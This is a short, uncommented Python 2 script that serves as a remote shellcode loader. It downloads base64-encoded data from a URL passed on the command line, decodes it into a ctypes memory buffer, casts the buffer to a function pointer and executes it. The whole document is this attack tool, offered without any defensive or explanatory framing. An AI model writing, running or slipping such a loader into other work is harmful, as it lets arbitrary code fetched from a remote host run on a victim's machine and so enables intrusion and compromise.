import urllib2
import ctypes
import base64
import sys

url = sys.argv[1]
request = urllib2.urlopen(url)
shellcode = base64.b64decode(request.read())
buffer = ctypes.create_string_buffer(shellcode, len(shellcode))
shell_execute = ctypes.cast(buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))
shell_execute()
